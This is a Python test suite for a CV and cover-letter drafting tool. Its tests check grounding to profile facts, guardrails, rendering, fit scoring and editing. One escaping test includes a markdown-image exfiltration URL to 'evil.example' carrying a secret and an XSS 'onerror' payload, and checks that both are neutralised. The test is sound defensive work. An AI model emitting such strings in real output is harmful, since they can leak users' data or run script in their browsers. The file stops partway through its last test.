"""Offline tests: no API calls. Run with  .venv/bin/python -m pytest -q"""
import pytest
from pathlib import Path

from cvdrafter import config, files, importer, render
from cvdrafter.generate import post_process
from cvdrafter.llm import LLMError, parse_json
from cvdrafter.preview import cv_html, word_diff
from cvdrafter.profile import graduation, load_profile, validate_profile
from cvdrafter.textutil import safe, safe_html, unsupported_numbers
from cvdrafter.verify import check_deterministic, errors

LIMITS = config.load_slots()["limits"]
ANALYSIS = {"keywords": [{"term": "Python", "type": "hard", "in_profile": True},
                         {"term": "Kubernetes", "type": "hard", "in_profile": False}]}


def faithful_raw(profile):
    """What a perfect model would return: original facts, original order."""
    return {
        "experience": {j["id"]: [{"text": f["text"], "sources": [f["id"]]} for f in j["facts"]] for j in profile["experience"]},
        "projects": [{"id": p["id"], "bullets": [{"text": f["text"], "sources": [f["id"]]} for f in p["facts"]]} for p in profile["projects"]],
        "skills": [{"category": c, "items": list(items)} for c, items in profile["skills"].items()],
        "cover_letter": [{"text": "word " * 70, "sources": ["acme.1"]} for _ in range(4)],
    }


def test_profile_is_valid():
    assert validate_profile(load_profile()) == []


def test_faithful_draft_passes_checks():
    p = load_profile()
    draft, _ = post_process(faithful_raw(p), p, LIMITS)
    errs = [e for e in errors(check_deterministic(draft, p, ANALYSIS, "", "", LIMITS)) if "Too long" not in e["message"]]
    assert errs == []


def test_catches_invented_number_foreign_fact_and_absent_skill():
    p = load_profile()
    raw = faithful_raw(p)
    raw["experience"]["acme"][0] = {"text": "Built a Kubernetes rule engine with 55 rules", "sources": ["acme.3"]}
    raw["experience"]["beta"][0] = {"text": "Built P&L reports", "sources": ["acme.1"]}
    draft, _ = post_process(raw, p, LIMITS)
    msgs = " ".join(e["message"] for e in errors(check_deterministic(draft, p, ANALYSIS, "", "", LIMITS)))
    assert "55" in msgs and "Kubernetes" in msgs and "different job" in msgs


def test_guardrails_in_cover_letter():
    p = load_profile()
    raw = faithful_raw(p)
    raw["cover_letter"][0] = {"text": "I am passionate about this. The classifier is in production.", "sources": ["acme.1"]}
    draft, _ = post_process(raw, p, LIMITS)
    msgs = " ".join(e["message"] for e in errors(check_deterministic(draft, p, ANALYSIS, "", "", LIMITS)))
    assert "passionate" in msgs and "in production" in msgs


def test_skills_cannot_be_added():
    p = load_profile()
    raw = faithful_raw(p)
    raw["skills"][0]["items"].append("Rust")
    draft, notes = post_process(raw, p, LIMITS)
    assert "Rust" not in str(draft["skills"]) and any("Rust" in n["message"] for n in notes)


def test_render():
    p = load_profile()
    draft, _ = post_process(faithful_raw(p), p, LIMITS)
    draft["experience"]["acme"][2]["text"] = "Built a Java rule engine encoding **40+ bank-specific rules** & tests"
    files = render.render_documents(draft, p, "Acme & Co", "Quant Intern")
    from docx import Document
    text = "\n".join(par.text for par in Document(files["cv_docx"]).paragraphs)
    assert "JANE DOE" in text and "40+ bank-specific rules & tests" in text and "{{" not in text


def test_every_render_keeps_the_template_design():
    """Page, margins, fonts and styles come from the template, whatever text goes in."""
    from docx import Document

    def design(path):
        d = Document(path)
        s = d.sections[0]
        return (s.page_width, s.page_height, s.left_margin, s.right_margin, s.top_margin, s.bottom_margin,
                d.styles["Normal"].font.name, d.styles["Normal"].font.size,
                {r.font.name for par in d.paragraphs for r in par.runs} - {None}, {par.style.name for par in d.paragraphs})
    p = load_profile()
    draft, _ = post_process(faithful_raw(p), p, LIMITS)
    for _ in range(2):  # a second, different draft must look the same
        files = render.render_documents(draft, p, "Acme", "Intern", app_id=3)
        assert design(files["cv_docx"]) == design(config.CV_TEMPLATE)
        assert design(files["cl_docx"]) == design(config.CL_TEMPLATE)
        draft["cover_letter"][0]["text"] = "A much shorter **first** paragraph."


# ---------------------------------------------------------------- regression tests for the review fixes

@pytest.mark.parametrize("text, source, bad", [
    ("raised accuracy to 95%", "accuracy 9.5%", ["95"]),
    ("1.5x faster", "15x faster", ["1.5"]),
    ("1000 users", "1,000 users", []),
    ("1.000 users", "1,000 users", []),
    ("2.5x", "2,5x", []),
    ("2 teams", "12 teams", ["2"]),
])
def test_number_check_does_not_confuse_decimals(text, source, bad):
    assert unsupported_numbers(text, source) == bad


def test_empty_yaml_fields_never_print_none():
    p = load_profile()  # the fixture has an empty "linkedin:"
    assert "linkedin" not in p["personal"]
    assert "None" not in render._personal(p)["contact_line"]
    assert "None" not in cv_html(post_process(faithful_raw(p), p, LIMITS)[0], p)


@pytest.mark.parametrize("raw", [
    {"skills": ["Python"]}, {"projects": ["rag"]}, {"experience": ["x"]}, {"experience": {"acme": "one bullet"}},
    {"cover_letter": "one paragraph"}, {"warnings": "a single warning"}, {"skills": [{"category": "X", "items": "Python"}]},
])
def test_post_process_survives_malformed_model_output(raw):
    p = load_profile()
    draft, _ = post_process(raw, p, LIMITS)
    assert set(draft["experience"]) == {"acme", "beta"}
    if "warnings" in raw:
        assert draft["warnings"] == ["a single warning"]


def test_parse_json_rejects_non_objects():
    with pytest.raises(LLMError):
        parse_json('[{"a": 1}]')
    assert parse_json('```json\n{"a": 1}\n```') == {"a": 1}


def test_escaping_blocks_html_and_markdown_images():
    attack = "![x](https://evil.example/?d=secret) <img src=x onerror=alert(1)>"
    assert "](" not in safe(attack) and "<img" not in safe(attack)
    assert "<img" not in safe_html(attack) and "\n" not in safe_html("a\n\nb")
    assert "<img" not in word_diff("built a tool", attack)


def test_same_role_same_day_does_not_overwrite():
    p = load_profile()
    draft, _ = post_process(faithful_raw(p), p, LIMITS)
    a = render.render_documents(draft, p, "Acme", "Intern", app_id=1)
    b = render.render_documents(draft, p, "Acme", "Intern", app_id=2)
    assert a["cv_docx"] != b["cv_docx"]


def test_rendering_again_keeps_every_version():
    from cvdrafter import files
    p = load_profile()
    draft, _ = post_process(faithful_raw(p), p, LIMITS)
    a = render.render_documents(draft, p, "Acme", "Intern", app_id=7)
    draft["cover_letter"][0]["text"] = "A rewritten first paragraph."
    b = render.render_documents(draft, p, "Acme", "Intern", app_id=7)
    assert a["cv_docx"] != b["cv_docx"] and Path(a["cv_docx"]).exists() and Path(a["cl_docx"]).exists()
    h = [e for e in files.history() if e["app_id"] == 7]
    assert len(h) == 2 and h[0]["cover_letter"][0] == "A rewritten first paragraph." and h[1]["cv"]


def test_writer_prompt_uses_profile_not_hardcoded_person():
    from cvdrafter import generate, prompts
    p = load_profile()
    assert "Jane Doe" in generate._system(p) and graduation(p) in generate._schema(LIMITS, p)
    assert "Jane Doe" not in prompts.WRITER_SYSTEM + prompts.SCHEMA


def test_validate_profile_does_not_write_files():
    assert files.validate("profile.yaml", "personal: [not, a, mapping]")
    assert files.validate("profile.yaml", "- just a list")
    assert not files.VERSIONS_DIR.exists()


def test_importer_redacts_contacts_before_sending(monkeypatch):
    sent = {}
    monkeypatch.setattr(importer, "chat_json", lambda system, user, *a, **k: sent.setdefault("user", user) and
                        {"personal": {"name": "Jane", "email": "[email removed]", "phone": ""}})
    out = importer.draft_profile_yaml("Jane Doe | (312) 555-0199 | jane@example.com | 2022-2024", "m")
    assert "jane@example.com" not in sent["user"] and "555-0199" not in sent["user"] and "2022-2024" in sent["user"]
    assert "jane@example.com" in out and "555-0199" in out


# ---------------------------------------------------------------- posting cleanup and keyword matching

LINKEDIN_POSTING = """About the job
Job Description:

At Acme Markets, we build exchanges. Interns contribute to projects that are intended for production use and \
collaborate with experienced engineers, product owners, and business stakeholders on real problems every day.

Technologies You May Work With

C++
Python

Qualifications

Has experience programming in one or more languages such as C++, Java, Python, C#, or JavaScript
Understanding of software testing, version control, and Agile development methodologies

Benefits And Perks

Competitive compensation
2:1 401(k) match, up to 8% match immediately upon hire.

Equal Employment Opportunity

We're proud to be an equal opportunity employer.

This position is not eligible for visa sponsorship.

The national new hire base pay range for this job in the United States is $22.00 - $42.00 per hour.
Benefits found in job post
401(k)
"""


def test_posting_clean_and_core():
    from cvdrafter.posting import clean, core
    c = clean(LINKEDIN_POSTING)
    assert c.startswith("At Acme Markets") and "Benefits found" not in c
    assert "visa sponsorship" in c and "$22.00" in c  # the analyst still sees eligibility and pay
    k = core(LINKEDIN_POSTING)
    assert "Qualifications" in k and "Agile" in k and "C++" in k
    assert "401(k)" not in k and "sponsorship" not in k and "$22.00" not in k and "equal opportunity" not in k


def test_core_never_returns_a_stub():
    from cvdrafter.posting import core
    jd = "Benefits\n\nWe pay well and offer a 401(k) with a generous match for everyone who joins the team."
    assert core(jd) == jd


def test_term_aliases():
    from cvdrafter.textutil import has_term
    assert has_term("ReactJS", "built a react dashboard") and has_term("React", "used React.js")
    assert has_term("Postgres", "PostgreSQL schema") and not has_term("Node.js", "each tree node")


def test_mentioned_keywords_stay_out_of_gap_radar():
    from cvdrafter.insights import gap_radar
    apps = [{"analysis": {"keywords": [{"term": "C++", "type": "hard", "in_profile": False, "weight": "mentioned"},
                                       {"term": "Agile", "type": "hard", "in_profile": False, "weight": "preferred"}]}}]
    assert [k["term"] for k in gap_radar(apps)] == ["Agile"]


# ---------------------------------------------------------------- voice and matches

def test_ai_voice_is_caught_in_the_cover_letter():
    p = load_profile()
    raw = faithful_raw(p)
    raw["cover_letter"][0] = {"text": "As a student, I honed my skills — not just coding, but design. " + "word " * 60,
                              "sources": ["acme.1"]}
    draft, _ = post_process(raw, p, LIMITS)
    msgs = " ".join(e["message"] for e in errors(check_deterministic(draft, p, ANALYSIS, "", "", LIMITS)))
    assert "honed" in msgs and "dash" in msgs and "Not X" in msgs and "As a" in msgs


def test_plain_letter_has_no_voice_errors():
    from cvdrafter.voice import paragraph_tells
    text = ("I'm applying for the Software Engineer Intern role. At Acme I built a rule engine in Java and wrote its "
            "test suite. It runs on every release. I'd like to talk about how that work fits your team.")
    assert paragraph_tells(text, first=True) == []
    assert paragraph_tells("Dates 2018–2020 are fine.") == []


def test_match_map_shows_where_keywords_and_requirements_land():
    from cvdrafter.matches import match_map
    p = load_profile()
    draft, _ = post_process(faithful_raw(p), p, LIMITS)
    analysis = {"keywords": ANALYSIS["keywords"],
                "requirements": [{"text": "Python", "importance": "must", "status": "covered", "fact_ids": ["acme.1"]}]}
    m = match_map(draft, analysis, p)
    kw = {k["term"]: k for k in m["keywords"]}
    assert kw["Kubernetes"]["state"] == "blocked"
    assert m["requirements"][0]["where"] and m["requirements"][0]["shown"]


def test_match_map_counts_locked_education_lines():
    from cvdrafter.matches import match_map
    p = load_profile()
    draft, _ = post_process(faithful_raw(p), p, LIMITS)
    edu = p["education"][0]
    analysis = {"keywords": [], "requirements": [
        {"text": "Degree", "importance": "must", "status": "covered", "fact_ids": [edu["id"]]}]}
    where = match_map(draft, analysis, p)["requirements"][0]["where"]
    assert where == [f"Education · {edu['institution']}"]


# ---------------------------------------------------------------- render gate, evaluation and flags

@pytest.fixture
def own_guardrails(tmp_path, monkeypatch):
    """A writable copy of the fixture guardrails, with a per-job never-mention list for acme."""
    path = tmp_path / "guardrails.yaml"
    path.write_text((Path(__file__).parent / "fixtures" / "guardrails.yaml").read_text()
                    + "never_mention_for:\n  acme:\n    - backtesting\n    - Board\n")
    monkeypatch.setattr(config, "GUARDRAILS_PATH", path)
    monkeypatch.setitem(files.EDITABLE, "guardrails.yaml", (path, *files.EDITABLE["guardrails.yaml"][1:]))
    return path


def test_job_specific_terms_are_blocked_in_cv_and_letter(own_guardrails):
    from cvdrafter.verify import evaluate
    p = load_profile()
    draft, _ = post_process(faithful_raw(p), p, LIMITS)
    draft["experience"]["acme"][0]["text"] = "Built a backtesting engine for the classifier"
    draft["cover_letter"][0]["text"] = "At Acme I presented my work to the Board. " + "word " * 60
    ev = evaluate(draft, p, {}, "", "", LIMITS)
    found = {i["location"] for i in ev["issues"] if "must never be said about acme" in i["message"]}
    assert found == {"experience/acme/1", "cover_letter/1"} and ev["status"] == "errors"
    beta = next(iter(draft["experience"]["beta"]))
    beta["text"] = "Backtesting is fine here"  # the list only applies to acme
    assert not any("beta" in i["location"] and "must never" in i["message"] for i in evaluate(draft, p, {}, "", "", LIMITS)["issues"])


def test_evaluation_is_only_verified_when_the_ai_check_ran(monkeypatch):
    from cvdrafter import verify
    from cvdrafter.llm import LLMError
    p = load_profile()
    draft, _ = post_process(faithful_raw(p), p, LIMITS)
    draft["cover_letter"] = []  # no word-count warnings, so a clean draft
    assert verify.evaluate(draft, p, {}, "", "", LIMITS)["status"] == "unverified"
    monkeypatch.setattr(verify, "check_with_llm", lambda *a: [])
    assert verify.evaluate(draft, p, {}, "", "", LIMITS, "opus")["status"] == "verified"

    def down(*a):
        raise LLMError("offline")
    monkeypatch.setattr(verify, "check_with_llm", down)
    ev = verify.evaluate(draft, p, {}, "", "", LIMITS, "opus")
    assert ev["status"] == "errors" and ev["errors"] == 1 and not ev["ai_checked"]  # blocks the render


def test_placeholders_block_only_the_render():
    from cvdrafter import verify
    p = load_profile()
    draft, _ = post_process(faithful_raw(p), p, LIMITS)
    draft["experience"]["acme"][0]["text"] = "Built [tool name] for the team"
    hits = lambda issues: [i["level"] for i in issues if "Placeholder" in i["message"]]  # noqa: E731
    assert hits(verify.check_deterministic(draft, p, {}, "", "", LIMITS)) == ["warning"]  # fix rounds leave it alone
    assert hits(verify.evaluate(draft, p, {}, "", "", LIMITS)["issues"]) == ["error"]


def test_posting_numbers_are_never_evidence_about_you():
    from cvdrafter import verify
    p = load_profile()
    draft, _ = post_process(faithful_raw(p), p, LIMITS)
    para = draft["cover_letter"][0]
    para["text"] = "I bring 7 years of Python. " + para["text"]
    jd = "We want 7 years of Python."

    def levels(sources):
        para["sources"] = sources
        return [i["level"] for i in verify.check_deterministic(draft, p, {}, jd, "", LIMITS)
                if i["location"] == "cover_letter/1" and "7" in i["message"] and "Number" in i["message"]]
    assert levels([s for s in para["sources"] if s != "jd"]) == ["error"]  # not citing the posting
    assert levels([*para["sources"], "jd"]) == ["warning"]  # citing it: allowed, but flagged


def test_tools_named_like_words_need_the_tool_name():
    from cvdrafter.textutil import has_term
    assert not has_term("Go", "we go live in May") and not has_term("Excel", "I excel at it") and not has_term("R", "R&D")
    assert has_term("go", "services in Go") and has_term("Golang", "Go services") and has_term("excel", "Excel models")


def test_render_stores_its_evaluation_and_flags_stay_with_their_document():
    p = load_profile()
    draft, _ = post_process(faithful_raw(p), p, LIMITS)
    render.render_documents(draft, p, "Acme", "Intern", app_id=3, evaluation={"status": "verified", "errors": 0})
    e = files.history()[0]
    assert e["evaluation"]["status"] == "verified" and e["flags"] == []
    files.add_flag(e["folder"], "cl", "Paragraph 2", "Wrong team name")
    files.resolve_flag(e["folder"], 0)
    assert files.history()[0]["flags"] == [{**files.history()[0]["flags"][0], "doc": "cl", "resolved": True}]


def test_flag_can_become_a_rule_without_losing_the_file(own_guardrails):
    from cvdrafter.profile import load_guardrails
    before = own_guardrails.read_text()
    assert files.add_claim_guard('Acme: never say "led"; I was one of three interns') == []
    g = load_guardrails()
    assert g["claim_guards"][-1] == 'Acme: never say "led"; I was one of three interns'
    assert g["never_mention_for"] == {"acme": ["backtesting", "Board"]} and "in production" in g["never_mention"]
    assert files.versions("guardrails.yaml")[0].read_text() == before


def test_direction_demand_counts_each_posting_once_per_skill(monkeypatch):
    from cvdrafter import insights

    def app(i, role_type, terms):
        return {"id": i, "company": f"C{i}", "analysis": {"role_type": role_type, "keywords": [
            {"term": t, "type": "hard", "weight": w, "in_profile": False} for t, w in terms]}}
    apps = [app(1, "trading/quant/fintech", [("C++", "required"), ("cpp", "preferred"), ("Bachelor's", "required")]),
            app(2, "trading/quant/fintech", [("Python", "required"), ("Kafka", "mentioned")]),
            app(3, "ai engineering", [("Python", "required")])]
    reply = {"terms": [{"term": "C++", "skill": "C++", "category": "language"}, {"term": "cpp", "skill": "C++", "category": "language"},
                       {"term": "Python", "skill": "Python", "category": "language"}]}  # Bachelor's left out: not a skill
    monkeypatch.setattr(insights, "chat_json", lambda *a, **k: reply)
    mapping, mapped = insights.skill_map(apps, "haiku")
    assert mapped and mapping["Bachelor's"]["category"] == "skip" and "Kafka" not in mapping  # "mentioned" isn't demand
    trading = insights.direction_demand(apps, mapping, "I use Python daily")["Trading / quant"]
    shares = {r["skill"]: (r["share"], r["have"]) for r in trading["skills"]}
    assert trading["postings"] == 2 and shares["C++"] == (0.5, False) and shares["Python"] == (0.5, True)


def test_default_cv_is_reused_word_for_word_and_only_the_letter_is_written(monkeypatch):
    import yaml
    from cvdrafter import default_cv, generate, memory, verify
    memory.init_db()
    p = load_profile()
    raw = faithful_raw(p)
    config.DEFAULT_CV_PATH.write_text(yaml.safe_dump({k: raw[k] for k in ("experience", "projects", "skills")}))
    prompts_seen = []

    def fake_writer(system, user, model, **k):
        prompts_seen.append(user)
        return {"cover_letter": raw["cover_letter"], "experience": {"acme": [{"text": "Invented", "sources": []}]}}
    monkeypatch.setattr(generate, "chat_json", fake_writer)
    ctx = dict(company="X", role="Y", jd="We use Python.", notes="", extra="", analysis=ANALYSIS, profile=p, app_id=None)
    result = generate.draft_application(ctx, "w", None)
    assert not result["tailored_cv"] and "Write ONLY the cover letter" in prompts_seen[0]
    assert result["draft"]["experience"] == default_cv.load(p)["experience"]  # the writer can't touch the CV

    checked = []
    monkeypatch.setattr(verify, "chat_json", lambda s, user, *a, **k: checked.append(user) or {"issues": []})
    pid = p["projects"][0]["id"]
    letter = [{"text": "About my project.", "sources": [p["projects"][0]["facts"][0]["id"]]}]
    verify.check_with_llm({**result["draft"], "cover_letter": letter}, p, "", "", "c")
    assert "experience/" not in checked[0]  # default CV lines were checked once, at setup
    assert f"[{pid}] Project: {p['projects'][0]['name']}" in checked[0]  # the checker sees the project's name

    assert generate.draft_application(ctx, "w", None, tailor_cv=True)["tailored_cv"]


def test_rewrite_letter_keeps_the_cv_and_passes_on_the_problems_and_your_instruction(monkeypatch):
    from cvdrafter import generate, memory
    memory.init_db()
    p = load_profile()
    draft, _ = post_process(faithful_raw(p), p, LIMITS)
    seen = []

    def fake_writer(system, user, model, **k):
        seen.append(user)
        return {"cover_letter": [{"text": "A new first paragraph.", "sources": ["acme.1"]}],
                "experience": {"acme": [{"text": "Invented", "sources": []}]}}
    monkeypatch.setattr(generate, "chat_json", fake_writer)
    ctx = dict(company="X", role="Y", jd="We use Python.", notes="", extra="", analysis=ANALYSIS, profile=p, app_id=None)
    problems = [{"level": "error", "location": "cover_letter/1", "message": "Lists coursework"},
                {"level": "error", "location": "company", "message": "Company is a guess"},
                {"level": "error", "location": "experience/acme/1", "message": "CV problem"}]
    result = generate.rewrite_letter(ctx, draft, "w", None, problems, "say when I graduate")
    asked = seen[0].split("PROBLEMS:")[-1]
    assert "Lists coursework" in asked and "say when I graduate" in asked
    assert "Company is a guess" not in asked and "CV problem" not in asked  # not the letter's to fix
    assert "Write ONLY the cover letter" in seen[0]
    new = result["draft"]
    assert new["cover_letter"][0]["text"] == "A new first paragraph."
    assert {k: new[k] for k in generate.CV_SLOTS} == {k: draft[k] for k in generate.CV_SLOTS}  # the CV is untouched


def test_cover_letter_template_has_the_cv_header_and_no_justified_text(tmp_path):
    from docx import Document
    p = load_profile()
    draft, _ = post_process(faithful_raw(p), p, LIMITS)
    out = render._render(config.CL_TEMPLATE, render.cl_context(draft, p, "Acme"), tmp_path / "cl.docx")
    paras = Document(out).paragraphs
    texts = [x.text for x in paras]
    assert texts[1] == render._personal(p)["contact_line"] and texts.count(p["personal"]["name"]) == 1
    assert not any(x.alignment == 3 for x in paras)  # justified text leaves gaps between words

def _letter_errors(p, paragraph):
    raw = faithful_raw(p)
    raw["cover_letter"][0] = paragraph
    draft, _ = post_process(raw, p, LIMITS)
    return " ".join(e["message"] for e in errors(check_deterministic(draft, p, ANALYSIS, "", "", LIMITS))
                    if e["location"] == "cover_letter/1")


def test_letter_keeps_each_fact_with_its_own_project():
    p = load_profile()
    p["general_facts"].append({"id": "general.view", "text": "Would rather ship the simple model that wins",
                               "skills": [], "about": "forecast"})
    misplaced = _letter_errors(p, {"text": "On my own, I built a RAG pipeline. I'd rather ship the simple model that wins.",
                                   "sources": ["rag.1", "general.view"]})
    assert "comes from forecast" in misplaced
    mixed = _letter_errors(p, {"text": "I evaluated retrieval on hand-written questions and forecast monthly inflation.",
                               "sources": ["rag.1", "forecast.1"]})
    assert "different projects" in mixed
    fine = _letter_errors(p, {"text": "On my own, I forecast monthly inflation. I'd rather ship the simple model that wins.",
                              "sources": ["forecast.1", "general.view"]})
    assert "comes from" not in fine and "different projects" not in fine


def test_letter_drops_coursework_and_premature_finishing():
    from datetime import datetime
    from cvdrafter.verify import months_to_graduation
    p = load_profile()
    p["personal"]["graduation"] = "Expected May 2099"
    msgs = _letter_errors(p, {"text": "I'm finishing my MS at State University. My coursework includes Algorithms.",
                              "sources": ["state_u"]})
    assert "Lists coursework (Algorithms)" in msgs and "overstates" in msgs
    assert months_to_graduation({"personal": {"graduation": "Expected March 2028"}, "education": []},
                                datetime(2026, 10, 22)) == 17


def test_editor_chat_changes_only_known_texts_and_keeps_their_sources(monkeypatch):
    from cvdrafter import generate
    from cvdrafter.verify import iter_items
    p = load_profile()
    draft, _ = post_process(faithful_raw(p), p, LIMITS)
    seen = []

    def fake_writer(system, user, model, **k):
        seen.append(user)
        return {"edits": [{"location": "experience/acme/1", "text": "Built a Python classifier for 3 asset classes"},
                          {"location": "experience/acme/2", "text": draft["experience"]["acme"][1]["text"]},  # unchanged
                          {"location": "experience/nowhere/9", "text": "Invented slot"},
                          {"location": "cover_letter/1", "text": ""}, "not an edit"],
                "reply": "Shortened the first Acme bullet."}
    monkeypatch.setattr(generate, "chat_json", fake_writer)
    ctx = dict(company="X", role="Y", jd="We use Python.", notes="", analysis=ANALYSIS, profile=p)
    out = generate.revise_texts(ctx, draft, "shorter first bullet", [{"role": "user", "content": "hi"}], "w")
    assert out == {"edits": {"experience/acme/1": "Built a Python classifier for 3 asset classes"},
                   "reply": "Shortened the first Acme bullet."}
    assert "REQUEST: shorter first bullet" in seen[0] and "user: hi" in seen[0]
    assert "experience/acme/1 · acme.1 ·" in seen[0]
    new = generate.apply_edits(draft, out["edits"])
    assert [i["sources"] for _, _, i, _ in iter_items(new)] == [i["sources"] for _, _, i, _ in iter_items(draft)]


def _req(text, status="covered", importance="must", kind="skill", evidence="direct", comment=""):
    return {"text": text, "status": status, "importance": importance, "kind": kind, "evidence": evidence,
            "fact_ids": ["acme.1"] if status != "missing" else [], "comment": comment}


def test_fit_verdict_levels_and_interpreted_evidence():
    from cvdrafter import fit
    strong = fit.assess({"seniority": "intern", "requirements": [_req("Python"), _req("SQL"), _req("CS degree", kind="background")]})
    assert (strong["level"], strong["score"]) == ("strong", 100)
    # discipline shown by varsity sport: an interpretation, worth 80% and explained in the strengths
    sport = _req("Strong discipline", kind="trait", evidence="transferable", comment="5 years of varsity sport")
    f = fit.assess({"requirements": [_req("Python"), sport]})
    assert f["score"] == round(100 * (3 + 1.5 * 0.8) / 4.5)
    assert "Strong discipline: 5 years of varsity sport" in f["strengths"] and "1 by interpretation" in f["summary"]
    # one core must-have missing caps the verdict at "good", two at "stretch"
    one = fit.assess({"requirements": [_req("Python"), _req("SQL"), _req("Java"), _req("C++", "missing"),
                                       _req("Go", importance="nice")]})
    assert one["level"] == "good" and "missing C++" in one["summary"]
    two = fit.assess({"requirements": [_req("Python"), _req("SQL"), _req("C++", "missing"), _req("Rust", "missing")]})
    assert two["level"] == "stretch"
    assert fit.assess({"requirements": [_req("C++", "missing"), _req("Rust", "missing"), _req("Python", "partial")]})["level"] == "no"
    # a missing soft skill costs less than a missing hard skill and never counts as a core gap
    soft = fit.assess({"requirements": [_req("Python"), _req("SQL"), _req("Leadership", "missing", kind="trait")]})
    assert soft["level"] == "good" and soft["score"] == 80
    assert fit.assess({"requirements": []})["level"] == "unclear"


def test_fit_blockers_and_risks():
    from cvdrafter import fit
    good = [_req("Python"), _req("SQL")]
    onsite = fit.assess({"requirements": good + [_req("On-site in London", "missing", kind="logistics", comment="you're in Chicago")]})
    assert onsite["level"] == "no" and onsite["blockers"] == ["On-site in London: you're in Chicago"]
    assert onsite["score"] == 100  # logistics are pass/fail, not part of the score
    assert fit.assess({"seniority": "senior", "requirements": good})["level"] == "no"
    nice = fit.assess({"requirements": good + [_req("Start in May", "missing", importance="nice", kind="logistics")]})
    assert nice["level"] == "strong" and nice["risks"] == ["Start in May"]
    visa = {"requirements": good, "eligibility": {"excludes_visa_holders": True, "work_authorization": "No sponsorship"}}
    assert fit.assess(visa)["level"] == "strong" and fit.assess(visa)["risks"] == ["Work authorization: No sponsorship"]
    p = load_profile()
    assert fit.assess(visa, {**p, "personal": {**p["personal"], "needs_sponsorship": True}})["level"] == "no"


def test_fit_reads_analyses_saved_before_kind_and_evidence():
    from cvdrafter import fit
    old = {"requirements": [{"text": "Python", "importance": "must", "status": "covered", "fact_ids": ["acme.1"], "comment": ""},
                            {"text": "C++", "importance": "must", "status": "missing", "fact_ids": [], "comment": ""}]}
    f = fit.assess(old)
    assert f["score"] == 50 and f["level"] == "stretch" and f["gaps"] == ["C++"]


def test_analysis_keeps_kind_and_evidence_only_when_valid(monkeypatch):
    from cvdrafter import analyze
    reply = {"company": "Acme", "requirements": [
        {"text": "Discipline", "importance": "must", "kind": "trait", "status": "covered", "evidence": "transferable",
         "fact_ids": ["acme.1"], "comment": "sport"},
        {"text": "Rust", "importance": "must", "kind": "wizardry", "status": "covered", "evidence": "transferable",
         "fact_ids": ["nope.9"], "comment": ""}]}
    monkeypatch.setattr(analyze, "chat_json", lambda *a, **k: reply)
    monkeypatch.setattr(analyze.co, "resolve", lambda *a, **k: {"company": "Acme", "confidence": "high", "source": ""})
    reqs = analyze.analyze_job("We want discipline.", "Acme", "Intern", load_profile(), "w")["requirements"]
    assert (reqs[0]["kind"], reqs[0]["evidence"]) == ("trait", "transferable")
    assert (reqs[1]["kind"], reqs[1]["status"], reqs[1]["evidence"]) == ("skill", "missing", "direct")  # no real evidence


def test_confirmed_interpretations_count_as_met():
    from cvdrafter import fit
    from cvdrafter.profile import add_interpretation, load_interpretations
    p = load_profile()
    add_interpretation("acme", ["leadership", "teamwork"], "trusted with the bank's rules")
    add_interpretation("gone.9", ["communication"])  # a fact that no longer exists is ignored
    reqs = [_req("Python"), _req("Teamwork and leadership", "partial", kind="trait"),
            _req("Excellent communication", "missing", kind="trait"),
            _req("Leadership on site in NYC", "missing", kind="logistics")]
    out = fit.apply_interpretations(reqs, load_interpretations(), __import__("cvdrafter.profile").profile.index_facts(p))
    team = out[1]
    assert (team["status"], team["evidence"], team["confirmed"]) == ("covered", "transferable", True)
    assert "acme" in team["fact_ids"] and "shows leadership (trusted with the bank's rules)" in team["comment"]
    assert out[2]["status"] == "missing" and out[3]["status"] == "missing" and out[0] == reqs[0]
    before = fit.assess({"requirements": reqs}, p, rules=[])
    after = fit.assess({"requirements": reqs}, p)
    assert after["score"] > before["score"] and any("Teamwork and leadership" in s for s in after["strengths"])


def test_form_question_limits_and_splitting():
    from cvdrafter import answers
    assert answers.limit("Why us? (max 500 characters)") == ("chars", 500)
    assert answers.limit("Describe a project in 150 words or less.") == ("words", 150)
    assert answers.limit("Why are you interested in this position?") is None
    assert answers.split_questions("1. Why this role?\n(max 300 characters)\n\n- Which AI tools do you use?\n") == [
        "Why this role? (max 300 characters)", "Which AI tools do you use?"]


def test_form_answers_are_checked_and_fixed(monkeypatch):
    from cvdrafter import answers
    p = load_profile()
    calls = []

    def fake(system, user, model, **k):
        calls.append(user)
        if len(calls) == 1:  # an invented number and an answer over the question's limit
            return {"answers": [{"n": 1, "answer": "I built a Python classifier used by 500 traders.", "sources": ["acme.1"]},
                                {"n": 2, "answer": "word " * 40, "sources": ["acme.1"]}]}
        return {"answers": [{"n": 1, "answer": "I built a Python news classifier that tags 3 asset classes.", "sources": ["acme.1"]},
                            {"n": 2, "answer": "Python, at Acme Bank.", "sources": ["acme.1"]}]}
    monkeypatch.setattr(answers, "chat_json", fake)
    ctx = dict(company="X", role="AI Intern", jd="We use Python.", notes="", analysis=ANALYSIS, profile=p)
    out = answers.answer_questions(ctx, ["Tell us about a project.", "Which tools? (max 100 characters)"], "w")
    assert "LIMIT: 100 chars" in calls[0] and "Why this role" in calls[0]
    fix = calls[1].split("PROBLEMS:")[-1]
    assert "[answer 1]" in fix and "500" in fix and "[answer 2]" in fix and "allows 100" in fix
    assert [a["answer"] for a in out] == ["I built a Python news classifier that tags 3 asset classes.", "Python, at Acme Bank."]
    assert not any(errors(a["issues"]) for a in out)


def test_cv_as_one_text_round_trips_and_keeps_each_bullets_sources():
    from cvdrafter import doctext
    p = load_profile()
    draft = post_process(faithful_raw(p), p, LIMITS)[0]
    text = doctext.cv_to_text(draft, p)
    acme = doctext.job_heading(p["experience"][0])
    assert text.startswith(f"# EXPERIENCE\n\n## {acme}\n- ") and "# SKILLS" in text
    same, problems = doctext.text_to_cv(text, draft, p)
    assert problems == [] and same == draft  # reading back what it wrote changes nothing

    lines = text.splitlines()
    first = next(i for i, l in enumerate(lines) if l.startswith("- "))
    sources = draft["experience"]["acme"][0]["sources"]
    lines[first] = lines[first] + " and **more**"  # edited a little
    del lines[first + 1]  # second bullet removed
    lines.insert(first + 1, "- A line I added")  # and one added under it
    out, problems = doctext.text_to_cv("\n".join(lines), draft, p)
    acme = out["experience"]["acme"]
    assert problems == [] and acme[0]["text"].endswith("and **more**") and acme[0]["sources"] == sources
    assert acme[1] == {"text": "A line I added", "sources": draft["experience"]["acme"][1]["sources"]}  # took the removed bullet's
    assert [b["text"] for b in acme[2:]] == [b["text"] for b in draft["experience"]["acme"][2:]]
    assert draft["experience"]["acme"][0]["text"] in text  # the draft you passed in is untouched


def test_cv_text_edits_skills_projects_and_explains_what_it_cannot_read():
    from cvdrafter import doctext
    p = load_profile()
    draft = post_process(faithful_raw(p), p, LIMITS)[0]
    text = doctext.cv_to_text(draft, p)
